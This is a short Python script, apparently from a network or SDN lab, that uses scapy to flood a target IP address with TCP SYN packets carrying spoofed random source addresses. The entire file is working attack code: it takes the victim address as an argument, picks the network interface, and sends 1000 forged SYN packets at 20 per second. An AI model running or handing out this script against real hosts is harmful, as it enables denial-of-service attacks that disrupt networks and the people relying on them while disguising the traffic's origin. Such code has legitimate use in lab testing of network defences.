#   python -E SYN_Flood.py victim_ip
"""
TCP_SYN flooding attack to target host IP address with fake source ip address.
This attack might be harmful to controller, switch, and even hosts within the network.
Send 1000 packets with the rate of 20 packets per second.
"""
import sys
import time
from os import popen
from scapy.all import sendp, IP, Ether, TCP, RandShort
from random import randint
import random
import string


def sourceIPgen():
    blacklist = [10, 127, 254, 255, 1, 2, 169, 172, 192]
    first = randint(1, 255)

    while first in blacklist:
        first = randint(1, 255)

    ip = ".".join([str(first), str(randint(1, 255)), str(
        randint(1, 255)), str(randint(1, 255))])
    print (ip)
    return ip


def main():
    dstIP = sys.argv[1]
    print (dstIP)

    interface = popen('ip link show | grep "eth0:" | awk \'{print $2}\' | tr -d ":"').read()
    if not interface.strip():
        interface = popen('ifconfig | grep "eth0" | awk \'{print $1}\'').read()
    print (repr(interface))

    payload = ""

    for i in range(1000):
        payload = "".join(random.choice(string.ascii_uppercase + string.digits +
                          string.ascii_lowercase) for x in range(randint(10, 40)))
        
        packets = Ether()/IP(dst=dstIP, src=sourceIPgen()) / \
            TCP(dport=int(RandShort()), sport=int(
                RandShort()), flags="S") / payload
        print(repr(packets))

        sendp(packets, iface=interface.rstrip(), inter=0.05)


if __name__ == "__main__":
    main()
